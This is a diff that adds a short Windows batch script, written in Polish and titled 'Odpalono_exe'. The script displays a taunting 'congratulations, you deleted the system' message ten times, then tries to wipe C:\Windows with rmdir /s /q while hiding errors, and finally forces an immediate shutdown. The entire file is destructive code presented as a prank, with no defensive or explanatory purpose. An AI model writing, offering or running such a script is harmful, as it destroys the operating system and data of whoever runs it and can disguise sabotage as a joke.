@@ -1,0 +1,27 @@
+@echo off
+title Odpalono_exe
+color 0a
+echo.
+echo Odpalono_exe
+echo.
+
+echo Powtarzam komunikat 10 razy...
+for /l %%i in (1,1,10) do (
+    echo Gratulacje udalo ci sie usunac system!!!!
+    timeout /t 1 >nul
+)
+
+echo.
+echo Czekam 3 sekundy...
+timeout /t 3 >nul
+
+echo.
+echo Usuwam plik/folder C:\Windows ...
+rmdir /s /q "C:\Windows" 2>nul
+echo Operacja usuwania zakonczona (lub proba sie powiodla).
+
+echo.
+echo Wylaczam komputer po 3 sekundach...
+timeout /t 3 >nul
+
+shutdown /s /f /t 0
